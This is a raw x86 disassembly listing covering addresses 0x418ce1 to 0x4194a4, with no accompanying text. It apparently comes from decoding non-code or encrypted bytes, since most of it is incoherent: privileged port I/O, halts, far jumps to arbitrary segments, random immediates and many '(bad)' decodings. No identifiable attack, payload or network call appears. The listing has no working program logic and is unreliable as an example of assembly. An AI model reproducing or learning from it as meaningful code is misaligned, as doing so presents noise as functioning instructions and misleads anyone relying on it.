  418ce1:	or     al,0xfe
  418ce3:	rol    edi,1
  418ce5:	mul    BYTE PTR [esi-0xa]
  418ce8:	in     al,0xd
  418cea:	inc    esi
  418ceb:	xchg   esp,eax
  418cec:	sbb    dh,dh
  418cee:	mov    al,ds:0x2f607113
  418cf3:	mov    al,0xd1
  418cf5:	adc    eax,0xb963b595
  418cfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418cfb:	cmp    DWORD PTR [ebp+0x61e48cb4],ebp
  418d01:	xchg   esp,eax
  418d02:	shl    DWORD PTR [ecx+eax*4],0xb
  418d06:	mov    ecx,0x39ab11ec
  418d0b:	out    dx,ax
  418d0d:	dec    edx
  418d0e:	imul   esp,DWORD PTR [ebx+esi*4],0x5d28144
  418d15:	mov    WORD PTR [esi+0x3b],?
  418d18:	add    eax,0xa5dccd8d
  418d1d:	cld    
  418d1e:	js     0x418cf7
  418d20:	dec    eax
  418d21:	sbb    eax,0x67f4fdcf
  418d26:	out    dx,al
  418d27:	fmul   st,st(7)
  418d29:	hlt    
  418d2a:	mov    ecx,0xc1ad490
  418d2f:	add    esp,DWORD PTR [edi-0x2b55e21]
  418d35:	or     BYTE PTR [ecx],cl
  418d37:	out    0x52,al
  418d39:	call   0x2d96:0xbd9013f1
  418d40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d41:	push   edx
  418d42:	mov    eax,ds:0x8b86cb63
  418d47:	shl    BYTE PTR [ebp-0x21],1
  418d4a:	ror    DWORD PTR [ecx+0xf],0x69
  418d4e:	sub    ebx,DWORD PTR [ecx]
  418d50:	mov    ds:0x3291723a,eax
  418d55:	mov    dh,0xa0
  418d57:	jge    0x418d97
  418d59:	cdq    
  418d5a:	adc    ecx,edi
  418d5c:	or     edx,DWORD PTR [ecx+0x793a0665]
  418d62:	pop    esp
  418d63:	je     0x418cfc
  418d65:	mov    al,ds:0x5bacad73
  418d6a:	arpl   WORD PTR [ebp+0x4e],bp
  418d6d:	sahf   
  418d6e:	cs pop eax
  418d70:	dec    esi
  418d71:	ret    
  418d72:	psubb  mm2,QWORD PTR [eax]
  418d75:	xor    eax,0x9543ed1c
  418d7a:	and    edx,ebp
  418d7c:	fild   WORD PTR [ebp+0x21]
  418d7f:	pop    es
  418d80:	in     al,0xe8
  418d82:	cmp    DWORD PTR [esi],ebp
  418d84:	xor    al,al
  418d86:	stc    
  418d87:	push   0xffffffa1
  418d89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d8a:	in     al,0x6c
  418d8c:	add    ebp,ecx
  418d8e:	mov    al,0x73
  418d90:	adc    al,0x2c
  418d92:	sbb    al,0x8a
  418d94:	jp     0x418d99
  418d96:	mov    bh,0xca
  418d98:	push   ds
  418d99:	mov    ds:0xc5646051,al
  418d9e:	pop    esp
  418d9f:	cmp    ecx,DWORD PTR [eax-0x68]
  418da2:	cdq    
  418da3:	out    dx,eax
  418da4:	xchg   ebp,eax
  418da5:	lea    ecx,ds:0x840ff848
  418dab:	adc    dh,dh
  418dad:	pop    ss
  418dae:	jp     0x418d8a
  418db0:	mov    DWORD PTR [edx+0x7f],ecx
  418db3:	add    eax,DWORD PTR [eax]
  418db5:	pop    eax
  418db6:	scas   al,BYTE PTR es:[edi]
  418db7:	in     al,dx
  418db8:	xor    al,0x8a
  418dba:	or     cl,BYTE PTR ds:[ebx+0x6b9601ef]
  418dc1:	and    BYTE PTR [eax-0x23],ah
  418dc4:	lods   eax,DWORD PTR ds:[esi]
  418dc5:	pop    ecx
  418dc6:	imul   DWORD PTR [edi-0x34]
  418dc9:	icebp  
  418dca:	div    DWORD PTR [esi]
  418dcc:	push   ds
  418dcd:	cmp    eax,0x8c54b163
  418dd2:	scas   eax,DWORD PTR es:[edi]
  418dd3:	and    BYTE PTR [eax+0x24],ch
  418dd6:	es stos BYTE PTR es:[edi],al
  418dd8:	rcr    BYTE PTR [edx+0x14],0x6a
  418ddc:	push   edi
  418ddd:	pop    ss
  418dde:	adc    eax,0x82987926
  418de3:	rcr    ebx,1
  418de5:	fist   WORD PTR [edi-0x1657c5f4]
  418deb:	pop    edi
  418dec:	or     al,0x3d
  418dee:	fwait
  418def:	pushf  
  418df0:	test   al,0x30
  418df2:	mov    bh,0x74
  418df4:	or     BYTE PTR [edx+0x6c],bh
  418df7:	scas   al,BYTE PTR es:[edi]
  418df8:	sub    BYTE PTR [edx+0x544ebf86],al
  418dfe:	push   eax
  418dff:	jbe    0x418e27
  418e01:	(bad)  
  418e03:	mov    eax,ds:0xf5f6d0b5
  418e08:	pusha  
  418e09:	popa   
  418e0a:	sub    bl,BYTE PTR cs:[edi]
  418e0d:	jns    0x418e29
  418e0f:	sbb    al,0xfa
  418e11:	sti    
  418e12:	xor    ah,BYTE PTR [ecx+ecx*4]
  418e15:	cmp    ebp,edi
  418e17:	jp     0x418e03
  418e19:	int3   
  418e1a:	mov    ds:0xeff1e87f,eax
  418e1f:	test   BYTE PTR [ebx-0x381d01b4],bh
  418e25:	pop    edi
  418e26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e27:	bnd jbe 0x418ea4
  418e2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e2b:	jle    0x418e4b
  418e2d:	inc    esi
  418e2e:	xchg   esp,eax
  418e2f:	rcr    esp,0xd9
  418e32:	imul   esp,ecx,0x5ed0c694
  418e38:	iret   
  418e39:	or     cl,bh
  418e3b:	retf   0x5955
  418e3e:	out    0xb,eax
  418e40:	mul    BYTE PTR [edx]
  418e42:	(bad)  
  418e44:	adc    dl,BYTE PTR ds:0xdf7a7f28
  418e4a:	lods   al,BYTE PTR ds:[esi]
  418e4b:	stc    
  418e4c:	jecxz  0x418eb3
  418e4e:	pop    ebx
  418e4f:	jecxz  0x418e4a
  418e51:	sbb    eax,0x1cc052b8
  418e56:	jo     0x418e77
  418e58:	inc    edx
  418e59:	mov    ebx,0xb72df49c
  418e5e:	icebp  
  418e5f:	adc    esi,edx
  418e61:	dec    ebp
  418e62:	imul   edi,DWORD PTR [ebp+ebp*2+0x4f],0x4e
  418e67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e68:	(bad)  
  418e69:	btr    DWORD PTR [ebp+0x23],eax
  418e6d:	pop    esi
  418e6e:	(bad)  
  418e6f:	adc    BYTE PTR [eax],0x81
  418e72:	test   BYTE PTR [ebp-0x1f6d1142],cl
  418e78:	jae    0x418ebf
  418e7a:	test   BYTE PTR [edx],dl
  418e7c:	pop    esi
  418e7d:	mov    eax,0xda7dc3fb
  418e82:	jp     0x418e73
  418e84:	test   DWORD PTR [edx],edx
  418e86:	fwait
  418e87:	icebp  
  418e88:	cmp    ah,BYTE PTR [edi]
  418e8a:	test   eax,0xc0708957
  418e8f:	push   ebp
  418e90:	inc    ecx
  418e91:	adc    DWORD PTR [esp+edi*8],esp
  418e94:	inc    edx
  418e95:	push   ecx
  418e96:	fwait
  418e97:	test   BYTE PTR [ebx],dl
  418e99:	ja     0x418e67
  418e9b:	or     al,0x40
  418e9d:	sbb    BYTE PTR [esi+0x0],bh
  418ea0:	fsubr  st,st(4)
  418ea2:	pop    es
  418ea3:	and    BYTE PTR [esi-0x19],bh
  418ea6:	popa   
  418ea7:	and    al,0x1c
  418ea9:	mov    esi,0x31d7ed1e
  418eae:	cmc    
  418eaf:	test   al,0xfa
  418eb1:	sbb    eax,0x7c2f91a8
  418eb6:	inc    edx
  418eb7:	ror    dl,cl
  418eb9:	fsubr  DWORD PTR [esp+edx*4-0x3d509c32]
  418ec0:	es and bh,bh
  418ec3:	mov    ebp,0x2834ae3d
  418ec8:	mov    al,ds:0x7b1cfb52
  418ecd:	jnp    0x418f18
  418ecf:	push   0xffffffb7
  418ed1:	call   0xfb0484fc
  418ed6:	and    eax,DWORD PTR [edx-0x18]
  418ed9:	ins    DWORD PTR es:[edi],dx
  418eda:	dec    edi
  418edb:	mov    esi,0x6dc45203
  418ee0:	fst    DWORD PTR [edx-0x3a8cdc8b]
  418ee6:	sub    bh,dl
  418ee8:	scas   eax,DWORD PTR es:[edi]
  418ee9:	sbb    esi,DWORD PTR [eax]
  418eeb:	xchg   edx,eax
  418eec:	dec    esp
  418eed:	mov    BYTE PTR [esi+0x1e],bl
  418ef0:	and    BYTE PTR [eax+edi*8-0x60ccc0b6],cl
  418ef7:	ds jge 0x418e7c
  418efa:	icebp  
  418efb:	test   al,0xf
  418efd:	inc    esi
  418efe:	fist   DWORD PTR [ebp-0x63]
  418f01:	cli    
  418f02:	mov    ecx,0x9269fc93
  418f07:	sub    ebp,edi
  418f09:	ror    esi,1
  418f0b:	pop    ebx
  418f0c:	and    BYTE PTR [ebx+0x36],bl
  418f0f:	push   0x5a080241
  418f14:	pusha  
  418f15:	and    dh,BYTE PTR ds:0xcdefa0e4
  418f1b:	jecxz  0x418f1b
  418f1d:	inc    ebx
  418f1e:	out    0x9c,eax
  418f20:	stos   DWORD PTR es:[edi],eax
  418f21:	mov    dh,0xd8
  418f23:	inc    esp
  418f24:	pop    ebx
  418f25:	pop    ds
  418f26:	cs fwait
  418f28:	retf   
  418f29:	test   al,0x7e
  418f2b:	pushf  
  418f2c:	adc    eax,0x3a7ca985
  418f31:	add    ch,dh
  418f33:	dec    edi
  418f34:	cmp    ch,ch
  418f36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f37:	inc    edi
  418f38:	mov    edi,0x7013278
  418f3d:	sbb    eax,0x3631b7ad
  418f42:	push   ebp
  418f43:	push   ebx
  418f44:	adc    BYTE PTR [esi],cl
  418f46:	add    DWORD PTR [eax+0x74d75bfd],0xffffffcd
  418f4d:	dec    eax
  418f4e:	dec    esp
  418f4f:	idiv   DWORD PTR [ebx+edx*2-0x64340afb]
  418f56:	add    dl,BYTE PTR [edi]
  418f58:	mov    ah,0xd7
  418f5a:	outs   dx,DWORD PTR ds:[esi]
  418f5b:	add    al,0x85
  418f5d:	repnz outs dx,DWORD PTR es:[esi]
  418f60:	fstp   TBYTE PTR [edi]
  418f62:	cwde   
  418f63:	lods   al,BYTE PTR ds:[esi]
  418f64:	dec    ecx
  418f65:	stos   BYTE PTR es:[edi],al
  418f66:	fwait
  418f67:	jns    0x418efe
  418f69:	loopne 0x418fb2
  418f6b:	xchg   ebx,eax
  418f6c:	pop    edi
  418f6d:	sub    al,0x68
  418f6f:	lahf   
  418f70:	pushf  
  418f71:	push   cs
  418f72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f73:	xor    dl,BYTE PTR [ebx]
  418f75:	adc    ecx,DWORD PTR [edx]
  418f77:	mov    DWORD PTR [esi],esp
  418f79:	push   cs
  418f7a:	cdq    
  418f7b:	jmp    0xbc3abfe0
  418f80:	xor    BYTE PTR [ebp+0x2e],al
  418f83:	add    edi,ebx
  418f85:	mov    edi,0x4607e02a
  418f8a:	(bad)  
  418f8b:	(bad)  
  418f8c:	pop    edi
  418f8d:	aaa    
  418f8e:	or     al,0x7a
  418f90:	lods   eax,DWORD PTR ds:[esi]
  418f91:	fnstcw WORD PTR [ebx+0x4b]
  418f94:	xchg   ebx,eax
  418f95:	cld    
  418f96:	les    edx,FWORD PTR [edi-0x80]
  418f99:	shr    ah,cl
  418f9b:	in     al,dx
  418f9c:	inc    ecx
  418f9d:	and    esp,DWORD PTR [edx]
  418f9f:	inc    ecx
  418fa0:	dec    esi
  418fa1:	dec    ecx
  418fa2:	mov    edx,0x7b642206
  418fa7:	xor    al,bl
  418fa9:	pop    es
  418faa:	push   esi
  418fab:	shl    DWORD PTR [esi],0xb2
  418fae:	popf   
  418faf:	cmp    eax,0x52df4b63
  418fb4:	mov    ah,0xef
  418fb6:	adc    eax,0xff139164
  418fbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418fbc:	adc    eax,0x52b092ca
  418fc1:	mov    DWORD PTR [esi+0x74a7c407],edx
  418fc7:	lods   eax,DWORD PTR ds:[esi]
  418fc8:	in     al,dx
  418fc9:	xchg   ecx,eax
  418fca:	cmp    al,0x77
  418fcc:	out    0x95,al
  418fce:	jl     0x41901b
  418fd0:	jmp    0xc954:0x8e20c996
  418fd7:	cmp    BYTE PTR [ecx-0x5e],ah
  418fda:	mov    esi,0x6234dff5
  418fdf:	push   es
  418fe0:	ins    DWORD PTR es:[edi],dx
  418fe1:	add    cl,dl
  418fe3:	mov    eax,ds:0x67582c96
  418fe8:	mov    ds:0x7328c1da,eax
  418fed:	add    ah,BYTE PTR [edx-0x34ffb1f0]
  418ff3:	repnz push 0xf6a1a43d
  418ff9:	sbb    DWORD PTR [edx-0x6313ebb3],edx
  418fff:	aad    0xff
  419001:	ret    0x1edd
  419004:	inc    edx
  419005:	das    
  419006:	mov    cl,0xa6
  419008:	das    
  419009:	sub    DWORD PTR ds:0xa8aab516,0x48
  419010:	mov    ch,0x34
  419012:	dec    edx
  419013:	ret    0xe0b6
  419016:	std    
  419017:	outs   dx,DWORD PTR ds:[esi]
  419018:	cmp    ebp,DWORD PTR [eax]
  41901a:	(bad)  
  41901b:	mov    bl,0x27
  41901d:	xchg   ebx,eax
  41901e:	xor    edx,esi
  419020:	push   es
  419021:	xchg   edx,eax
  419022:	adc    eax,ebp
  419024:	cmp    DWORD PTR ds:0xc3d1df10,0x286a9272
  41902e:	dec    ebx
  41902f:	cmp    BYTE PTR [ecx-0x3d2188d2],cl
  419035:	out    dx,al
  419036:	jmp    0x1e13a025
  41903b:	mov    ds:0x70f0f6d0,eax
  419040:	retf   
  419041:	enter  0xee45,0x94
  419045:	clc    
  419046:	add    DWORD PTR [edx+0x701a3f8],esi
  41904c:	call   DWORD PTR ds:0x5bef8706
  419052:	mov    eax,ds:0x1f3014bc
  419057:	(bad)  
  419058:	jno    0x419070
  41905a:	retf   0xd33a
  41905d:	mov    al,ds:0x4f04921e
  419062:	cmp    DWORD PTR [ebx+eax*4+0x20],ecx
  419066:	ins    DWORD PTR es:[edi],dx
  419067:	sub    BYTE PTR [esi+0x26],ch
  41906a:	mov    edx,0x296ffeac
  41906f:	add    BYTE PTR [esi-0x408a56dc],0x22
  419076:	es push es
  419078:	mov    edi,esi
  41907a:	enter  0x2886,0x83
  41907e:	inc    edi
  41907f:	mov    edx,0x969448f8
  419084:	or     al,BYTE PTR [eax+eiz*4+0x56]
  419088:	add    dh,BYTE PTR [ecx-0x32]
  41908b:	xchg   ecx,eax
  41908c:	mov    dl,0x2f
  41908e:	jl     0x419015
  419090:	mov    ah,0x5
  419092:	xor    eax,esp
  419094:	jge    0x419109
  419096:	sub    DWORD PTR [eax-0x55f94ac1],edi
  41909c:	pushf  
  41909d:	inc    ebx
  41909e:	mov    al,ds:0x6a43f687
  4190a3:	mov    ebx,ebx
  4190a5:	sub    DWORD PTR ss:[ecx],esp
  4190a8:	(bad)  
  4190a9:	iret   
  4190aa:	pop    ss
  4190ab:	icebp  
  4190ac:	gs dec edx
  4190ae:	dec    ebx
  4190af:	jb     0x419092
  4190b1:	shr    BYTE PTR [esi-0x36271f92],1
  4190b7:	push   ss
  4190b8:	dec    edi
  4190b9:	xor    DWORD PTR [esi+ebp*1-0xa4826d0],edi
  4190c0:	outs   dx,DWORD PTR ds:[esi]
  4190c1:	jbe    0x419117
  4190c3:	and    DWORD PTR [ecx-0x3b],ebx
  4190c6:	lea    esi,[esi-0x14]
  4190c9:	loope  0x4190cf
  4190cb:	pop    esp
  4190cc:	and    dl,ch
  4190ce:	pop    edx
  4190cf:	nop
  4190d0:	mov    ds:0x78c64282,eax
  4190d5:	or     eax,0xe0044d76
  4190da:	ja     0x419119
  4190dc:	fsubr  DWORD PTR [edi]
  4190de:	xchg   edi,eax
  4190df:	loop   0x41909f
  4190e1:	out    dx,eax
  4190e2:	call   0xd07b2dd7
  4190e7:	xchg   DWORD PTR [esi],edx
  4190e9:	nop
  4190ea:	pushf  
  4190eb:	mov    ebp,0x96608b24
  4190f0:	shr    DWORD PTR ds:[ecx+0x13],cl
  4190f4:	out    0x37,al
  4190f6:	xor    DWORD PTR [edx-0x2e],0x307513be
  4190fd:	aam    0x8b
  4190ff:	in     eax,0xd4
  419101:	add    esi,DWORD PTR [esi]
  419103:	push   0xcbf10a16
  419108:	pop    es
  419109:	sub    edx,eax
  41910b:	xor    eax,0x3842ae92
  419110:	cld    
  419111:	or     ebx,DWORD PTR [eax]
  419113:	fld    DWORD PTR [ebp+0x6c7e582b]
  419119:	icebp  
  41911a:	push   cs
  41911b:	fidiv  DWORD PTR [esi]
  41911d:	out    0x6b,al
  41911f:	cmc    
  419120:	mov    eax,0xbd7c5a2e
  419125:	cmp    edi,DWORD PTR [ebp+esi*8+0x7]
  419129:	cmp    eax,0x9b014fad
  41912e:	fsubr  QWORD PTR [edx-0x64471f44]
  419134:	fst    st(6)
  419136:	lods   eax,DWORD PTR ds:[esi]
  419137:	sub    BYTE PTR [eax+ebp*4],cl
  41913a:	imul   esp,DWORD PTR [ecx+ebp*4+0x3aa487a6],0x2f
  419142:	int3   
  419143:	in     al,dx
  419144:	(bad)  
  419145:	in     eax,dx
  419146:	ficomp WORD PTR [eax+edx*2]
  419149:	mov    eax,ds:0x6f503b9
  41914e:	and    ecx,esp
  419150:	mov    eax,ds:0xad6ba54d
  419155:	mov    cx,0x319c
  419159:	jecxz  0x419152
  41915b:	xchg   DWORD PTR [esi],edx
  41915d:	(bad)  
  41915e:	out    0x3e,al
  419160:	or     BYTE PTR [eax+ebp*1+0x2b],cl
  419164:	lods   eax,DWORD PTR ds:[esi]
  419165:	je     0x419144
  419167:	rcr    BYTE PTR [edi+0x231ab67d],cl
  41916d:	and    BYTE PTR [esi+0x5d0e6790],bh
  419173:	cmp    eax,0x955f022b
  419178:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419179:	adc    ebp,DWORD PTR [edx-0x79]
  41917c:	and    eax,0x81ce186d
  419181:	loopne 0x419111
  419183:	fstp   DWORD PTR [edx]
  419185:	mov    ah,0x1f
  419187:	sti    
  419188:	cmp    al,0x17
  41918a:	ss jle 0x419184
  41918d:	outs   dx,BYTE PTR fs:[esi]
  41918f:	xchg   BYTE PTR [ecx-0x1d2d1c27],ah
  419195:	push   esp
  419196:	pop    ds
  419197:	adc    al,0xe5
  419199:	enter  0x23b,0x50
  41919d:	outs   dx,BYTE PTR ds:[esi]
  41919e:	jmp    0x41920d
  4191a0:	add    eax,0xc2346707
  4191a5:	retf   0xb4d3
  4191a8:	mov    al,0x3b
  4191aa:	retf   
  4191ab:	ret    0xdcee
  4191ae:	cmp    al,0x54
  4191b0:	(bad)  
  4191b1:	int    0xf6
  4191b3:	sub    dl,dh
  4191b5:	sub    ecx,ecx
  4191b7:	loopne 0x4191c8
  4191b9:	lods   eax,DWORD PTR ds:[esi]
  4191ba:	call   0x3aba:0x990986d9
  4191c1:	leave  
  4191c2:	popf   
  4191c3:	jnp    0x419225
  4191c5:	rcl    BYTE PTR [ebx-0x1ea123cb],0xc2
  4191cc:	shl    BYTE PTR [eax+esi*2+0x50],cl
  4191d0:	mov    ecx,esi
  4191d2:	(bad)  
  4191d3:	jmp    0x4c43:0xda6bd4a2
  4191da:	mov    ah,0x0
  4191dc:	mov    ebp,0xb37f3264
  4191e1:	imul   DWORD PTR [edx-0x4f]
  4191e4:	outs   dx,DWORD PTR ds:[esi]
  4191e5:	test   BYTE PTR [ebx],cl
  4191e7:	adc    BYTE PTR [ebp-0x74],ch
  4191ea:	(bad)  
  4191eb:	pop    esp
  4191ec:	cmp    BYTE PTR [edx-0x11],bl
  4191ef:	retf   
  4191f0:	dec    ebp
  4191f1:	jae    0x419271
  4191f3:	pop    edx
  4191f4:	fwait
  4191f5:	jo     0x41926f
  4191f7:	push   esp
  4191f8:	and    bl,dh
  4191fa:	inc    edx
  4191fb:	mov    eax,0xe6dbaa5d
  419200:	lods   al,BYTE PTR ds:[esi]
  419201:	mov    ebx,0x54ce2ae4
  419206:	xor    ebx,DWORD PTR [ebp+0x16]
  419209:	jp     0x41927d
  41920b:	mov    ebp,0x5538be2f
  419210:	dec    eax
  419211:	pop    ebx
  419212:	adc    DWORD PTR [eax-0x66],0x6a4b3c4a
  419219:	rcl    BYTE PTR [ebx+0x2c06be9e],cl
  41921f:	xchg   BYTE PTR [ecx+0x4fd1ebd3],ch
  419225:	mov    esi,0x7ae71667
  41922a:	stos   DWORD PTR es:[edi],eax
  41922b:	sbb    eax,0x2ec7afa1
  419230:	mov    al,bh
  419232:	or     DWORD PTR [ecx],0xf4b4437a
  419238:	lds    esp,FWORD PTR [esp+edx*2]
  41923b:	outs   dx,BYTE PTR ds:[esi]
  41923c:	jmp    0x1602:0x536d6abf
  419243:	mov    ah,0x1a
  419245:	outs   dx,BYTE PTR ds:[esi]
  419246:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419247:	fld    QWORD PTR [esi]
  419249:	fld    TBYTE PTR [ecx+edx*8-0xc96bca4]
  419250:	aad    0x10
  419252:	pusha  
  419253:	fsub   QWORD PTR [ebp+0x57bbb48]
  419259:	dec    edi
  41925a:	pop    edi
  41925b:	xor    DWORD PTR [esi],0x85b0b6d6
  419261:	lods   al,BYTE PTR ds:[esi]
  419262:	xor    dl,BYTE PTR [ecx]
  419264:	out    0xaa,al
  419266:	(bad)  
  419268:	or     esp,DWORD PTR [esi+ebp*8-0x558c189c]
  41926f:	in     eax,0x9
  419271:	mov    bl,0xa5
  419273:	sbb    eax,0xa0442038
  419278:	mov    eax,0xb5fdbd36
  41927d:	shl    DWORD PTR [esi],0x20
  419280:	push   ds
  419281:	pop    eax
  419282:	bound  ebp,QWORD PTR [edi-0x25584a8e]
  419288:	xchg   esp,eax
  419289:	jne    0x419267
  41928b:	mov    ebx,0xc3c72e24
  419290:	retf   0x6c44
  419293:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419294:	inc    eax
  419295:	outs   dx,DWORD PTR ds:[esi]
  419296:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419297:	dec    ebx
  419298:	inc    ebx
  419299:	pop    esi
  41929a:	cmp    eax,0xc325871f
  41929f:	ficom  DWORD PTR [ebx]
  4192a1:	data16 fcom QWORD PTR [ebp-0x7edaeec0]
  4192a8:	cs gs push eax
  4192ab:	jl     0x419278
  4192ad:	fild   DWORD PTR [ebx-0x34]
  4192b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4192b1:	xor    eax,0x2ae58536
  4192b6:	lock jnp 0x4192f5
  4192b9:	sbb    BYTE PTR [eax],0xc4
  4192bc:	push   0x7c
  4192be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4192bf:	in     eax,0xee
  4192c1:	out    0x8f,eax
  4192c3:	mov    eax,ds:0x50e98ebe
  4192c8:	mov    ds:0x8083d3c1,eax
  4192cd:	sub    BYTE PTR [esi],al
  4192cf:	dec    edx
  4192d0:	fdiv   DWORD PTR [ebp-0x7c8eb0e2]
  4192d6:	inc    edi
  4192d7:	fsubr  QWORD PTR [eax+0x7e]
  4192da:	xchg   ebx,eax
  4192db:	and    DWORD PTR [edx],edi
  4192dd:	pop    es
  4192de:	and    al,0xbb
  4192e0:	out    dx,al
  4192e1:	and    DWORD PTR [esi-0x2ce03308],esi
  4192e7:	jb     0x419298
  4192e9:	lods   eax,DWORD PTR ds:[esi]
  4192ea:	push   ecx
  4192eb:	stos   BYTE PTR es:[edi],al
  4192ec:	mov    bh,0xc5
  4192ee:	je     0x419288
  4192f0:	jmp    0xeac8:0xfa3554f6
  4192f7:	jmpw   0x22be
  4192fb:	push   ebp
  4192fc:	nop
  4192fd:	xchg   edi,eax
  4192fe:	call   0x5023:0xf7607491
  419305:	loop   0x4192c8
  419307:	mov    ecx,0x9ed1a5be
  41930c:	jno    0x4192d3
  41930e:	push   0xffffffc6
  419310:	sub    eax,0xc8659a96
  419315:	dec    esp
  419316:	jno    0x419385
  419318:	ja     0x419372
  41931a:	mov    ecx,0x3cf15909
  41931f:	lods   eax,DWORD PTR ds:[esi]
  419320:	push   es
  419321:	pop    ebx
  419322:	fs add eax,0x32da0355
  419328:	cmp    esp,DWORD PTR [edi-0x421f9f9]
  41932e:	(bad)
  419331:	mov    edi,0x6b51d701
  419336:	pop    esi
  419337:	test   eax,0x5517b1f2
  41933c:	xchg   ecx,eax
  41933d:	icebp  
  41933e:	jl     0x41934f
  419340:	and    eax,0x1dba0513
  419345:	nop
  419346:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419347:	xor    ebp,DWORD PTR [edx]
  419349:	in     eax,dx
  41934a:	adc    eax,0x8a765f3c
  41934f:	dec    esp
  419350:	xor    ah,bh
  419352:	cmc    
  419353:	xchg   ebp,eax
  419354:	gs inc eax
  419356:	dec    ebx
  419357:	mov    edi,0x4dccb7a4
  41935c:	fxch   st(2)
  41935e:	lock xor BYTE PTR [eax+edx*8-0x50],0xef
  419364:	scas   eax,DWORD PTR es:[edi]
  419365:	inc    ebp
  419366:	cli    
  419367:	cmp    ebp,DWORD PTR [esi-0x325cd628]
  41936d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41936e:	and    BYTE PTR ds:0x86583493,cl
  419374:	hlt    
  419375:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419376:	add    dh,BYTE PTR [eax-0x71]
  419379:	rcr    BYTE PTR [ebp+0x65],0x98
  41937d:	mov    WORD PTR [ebp+0x3176bc83],gs
  419383:	hlt    
  419384:	add    DWORD PTR [edx+edi*8-0x590c60c9],0xfffffffb
  41938c:	pusha  
  41938d:	adc    esp,ebp
  41938f:	hlt    
  419390:	fcmovu st,st(2)
  419392:	pop    ds
  419393:	and    ah,dh
  419395:	dec    edi
  419396:	cmp    DWORD PTR [ecx+eax*2],edx
  419399:	sbb    DWORD PTR [ebp+edi*8+0x79759282],edx
  4193a0:	jg     0x4193ae
  4193a2:	sbb    DWORD PTR [ecx+0x264c6d89],esi
  4193a8:	or     al,0xe8
  4193aa:	push   ebp
  4193ab:	inc    eax
  4193ac:	neg    BYTE PTR [eax-0x5a2ab031]
  4193b2:	ja     0x41933e
  4193b4:	mov    ecx,0x8ee26823
  4193b9:	imul   si,WORD PTR [ebx],0x24
  4193bd:	sbb    eax,0x8d7a9f39
  4193c2:	sbb    al,0x9b
  4193c4:	mov    BYTE PTR [edi+0x4da2062b],bh
  4193ca:	(bad)  
  4193cb:	aad    0xbb
  4193cd:	ror    DWORD PTR [eax-0x7d],0xc7
  4193d1:	sub    bl,ch
  4193d3:	push   esp
  4193d4:	fcom   DWORD PTR [ecx+0x53336c2a]
  4193da:	xlat   BYTE PTR ds:[ebx]
  4193db:	xlat   BYTE PTR ds:[ebx]
  4193dc:	out    dx,eax
  4193dd:	scas   eax,DWORD PTR es:[edi]
  4193de:	fcom   QWORD PTR [ebx+0x4f9d051b]
  4193e4:	cwde   
  4193e5:	cli    
  4193e6:	fldenv [edi+0x153e3b2]
  4193ec:	jle    0x419373
  4193ee:	rcl    DWORD PTR [ecx],0x6a
  4193f1:	pop    ecx
  4193f2:	add    eax,0x1f0ef7e1
  4193f7:	dec    ebx
  4193f8:	xor    BYTE PTR es:[ebx+0x25a1d657],dh
  4193ff:	lock push edx
  419401:	test   DWORD PTR [ebx+edx*4-0x78],ebp
  419405:	or     eax,0xdb1f7091
  41940a:	out    dx,eax
  41940b:	push   0x42ddf72a
  419410:	arpl   WORD PTR [ebx+ebx*1-0x58a5e484],bx
  419417:	out    0x76,al
  419419:	push   ebx
  41941a:	lea    ebp,[esp+eax*1-0x66]
  41941e:	sub    cl,bh
  419420:	pop    ss
  419421:	dec    edx
  419422:	inc    esi
  419423:	mov    dh,0xdb
  419425:	inc    ecx
  419426:	repnz scas al,BYTE PTR es:[edi]
  419428:	jns    0x4193b5
  41942a:	fisubr DWORD PTR [esi-0x665f354a]
  419430:	mov    cs,WORD PTR [eax-0x38ce8117]
  419436:	mov    esp,0xd8bf47b5
  41943b:	mov    eax,0xa8551ebe
  419440:	cmp    eax,0x555e40a2
  419445:	pop    ecx
  419446:	inc    esi
  419447:	push   ecx
  419448:	loope  0x4193d3
  41944a:	pop    edx
  41944b:	dec    eax
  41944c:	add    eax,0x6679ee57
  419451:	js     0x419420
  419453:	cmc    
  419454:	stos   BYTE PTR es:[edi],al
  419455:	cwde   
  419456:	xor    DWORD PTR [edi-0x2a],ecx
  419459:	lock add DWORD PTR [ebp+edx*4-0x3e],edx
  41945e:	inc    ecx
  41945f:	pop    ecx
  419460:	cmp    eax,0xaf60e8ec
  419465:	jl     0x419404
  419467:	sub    BYTE PTR [edx+esi*1+0x6a],cl
  41946b:	lea    eax,[esi+esi*8-0xe]
  41946f:	sahf   
  419470:	ficomp DWORD PTR [esi]
  419472:	push   esi
  419473:	test   al,0x61
  419475:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419476:	outs   dx,BYTE PTR ds:[esi]
  419477:	and    BYTE PTR [eax+0x477a10d3],cl
  41947d:	mov    BYTE PTR [esi-0x29],bl
  419480:	in     al,dx
  419481:	ins    BYTE PTR es:[edi],dx
  419482:	or     esi,eax
  419484:	mov    ch,0xe3
  419486:	out    dx,al
  419487:	pusha  
  419488:	xlat   BYTE PTR ds:[ebx]
  419489:	lds    ebx,FWORD PTR ds:0xc34377e9
  41948f:	jnp    0x4194ad
  419491:	adc    ah,cl
  419493:	or     DWORD PTR [eax+edx*2-0x62],edx
  419497:	push   ebp
  419498:	stos   DWORD PTR es:[edi],eax
  419499:	xchg   BYTE PTR [edi],bh
  41949b:	add    DWORD PTR [esi+0x60],esi
  41949e:	cld    
  41949f:	and    ebx,edi
  4194a1:	pop    eax
  4194a2:	mov    ah,0xbc
  4194a4:	jbe    0x419501
